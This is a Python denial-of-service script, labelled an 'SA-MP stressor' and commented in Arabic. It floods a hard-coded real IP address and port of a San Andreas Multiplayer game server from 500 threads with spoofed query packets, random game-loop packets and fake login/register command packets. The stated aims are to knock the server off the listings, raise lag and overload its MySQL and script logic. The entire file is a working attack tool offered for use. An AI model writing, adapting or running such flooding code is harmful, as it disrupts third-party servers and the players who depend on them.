import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING OMNI-VECTOR MASTER SCRIPT (The Ultimate SA-MP Stressor) ===
# =====================================================================

TARGET_IP = "94.23.168.153"  # IP الهدف (أو السيرفر غير المحمي)
TARGET_PORT = 2343            # بورت السيرفر
DURATION = 190                # مدة الاختبار بالثواني
THREADS_COUNT = 500           # رفع عدد الخيوط لاستغلال قوة Ryzen 9 بالكامل

# أنواع استعلامات القوائم
QUERY_TYPES = [b'i', b'c', b'r', b'd']

# أوامر وهمية لاستهداف منطق السكربت وقاعدة البيانات (MySQL)
LOGIC_COMMANDS = [
    b'/login ', b'/register ', b'/stats ', 
    b'/buyhouse ', b'/carupgrade ', b'/changepass '
]

def omni_attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        client.setblocking(False) # وضع غير حظري لأقصى سرعة إرسال ممكنة
    except:
        pass
        
    end_time = time.time() + DURATION
    
    # تجهيز ترويسة الـ IP والبورت مسبقاً لتوفير دورات المعالج
    try:
        ip_bytes = socket.inet_aton(TARGET_IP)
        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
    except:
        return

    while time.time() < end_time:
        try:
            # 1. إرسال حزمة استعلام لإخفاء السيرفر من القوائم
            q_type = random.choice(QUERY_TYPES)
            query_packet = b'SAMP' + ip_bytes + port_bytes + q_type
            client.sendto(query_packet, (TARGET_IP, TARGET_PORT))

            # 2. إرسال حزمة مزامنة اللعبة (Game Loop / RPC) لرفع الـ Ping
            game_packet = b'SAMP' + bytes([random.randint(0, 255) for _ in range(4)]) + random._urandom(random.randint(256, 1024))
            client.sendto(game_packet, (TARGET_IP, TARGET_PORT))

            # 3. إرسال حزمة أوامر ومنطق وهمية لإرباك الـ MySQL والـ Pawn Script
            cmd = random.choice(LOGIC_COMMANDS)
            logic_packet = b'SAMP' + cmd + random._urandom(16)
            client.sendto(logic_packet, (TARGET_IP, TARGET_PORT))

        except:
            pass
            
    client.close()

def main():
    print(f"[*] === إطلاق الكود الأسطوري الشامل (Omni-Vector) ===")
    print(f"[*] الهدف: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] تشغيل {THREADS_COUNT} خيط سحابي يدمج (Query + Game Loop + SQL Logic)...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=omni_attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت الجلسة الأسطورية بنجاح.")

if __name__ == "__main__":
    main()
